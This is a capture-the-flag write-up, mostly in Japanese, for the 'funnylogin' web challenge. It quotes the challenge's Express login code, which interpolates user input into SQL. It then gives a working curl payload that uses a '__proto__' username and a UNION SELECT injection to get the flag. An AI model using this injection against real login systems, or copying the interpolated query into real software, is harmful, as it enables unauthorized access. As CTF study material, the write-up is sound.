# funnylogin:web:109pts
can you login as admin?  
NOTE: no bruteforcing is required for this challenge! please do not bruteforce the challenge.  
[funnylogin.mc.ax](https://funnylogin.mc.ax)  

[funnylogin.tar.gz](funnylogin.tar.gz)  

# Solution
URLとソースが渡される。  
アクセスするとただのログインフォームのようだ。  
![site.png](site/site.png)  
ソースを見るとapp.js主要部分は以下のようであった。  
```js
~~~
const users = [...Array(100_000)].map(() => ({ user: `user-${crypto.randomUUID()}`, pass: crypto.randomBytes(8).toString("hex") }));
db.exec(`INSERT INTO users (id, username, password) VALUES ${users.map((u,i) => `(${i}, '${u.user}', '${u.pass}')`).join(", ")}`);

const isAdmin = {};
const newAdmin = users[Math.floor(Math.random() * users.length)];
isAdmin[newAdmin.user] = true;

app.use(express.urlencoded({ extended: false }));
app.use(express.static("public"));

app.post("/api/login", (req, res) => {
    const { user, pass } = req.body;

    const query = `SELECT id FROM users WHERE username = '${user}' AND password = '${pass}';`;
    try {
        const id = db.prepare(query).get()?.id;
        if (!id) {
            return res.redirect("/?message=Incorrect username or password");
        }

        if (users[id] && isAdmin[user]) {
            return res.redirect("/?flag=" + encodeURIComponent(FLAG));
        }
        return res.redirect("/?message=This system is currently only available to admins...");
    }
    catch {
        return res.redirect("/?message=Nice try...");
    }
});
~~~
```
自明なSQLiがある。  
ただし、`users[id] && isAdmin[user]`がtrueの場合のみadminになれるようだ。  
はじめに`isAdmin[user]`について考える。  
大量に作られたユーザの一つだけがランダムに`isAdmin`のキーとして追加されており、誰がadminであるのかわからない。  
adminのユーザ名がわからないが、何とかしてtrueにしてやる必要がある。  
ここで、`__proto__`や`toString`を`user`に指定すると`undefined`にならないことに気づく。  
残りの`users[id]`だがSQLiのUNIONで適当な`id`を返してやればよい。  
以下のように行う。  
```bash
$ curl -X POST https://funnylogin.mc.ax/api/login -d "user=user&pass=pass"
Found. Redirecting to /?message=Incorrect%20username%20or%20password
$ curl -X POST https://funnylogin.mc.ax/api/login -d "user=__proto__&pass=' UNION SELECT id FROM users WHERE id = 1; -- satoki"
Found. Redirecting to /?flag=dice%7Bi_l0ve_java5cript!%7D
```
flagが得られた。  

## dice{i_l0ve_java5cript!}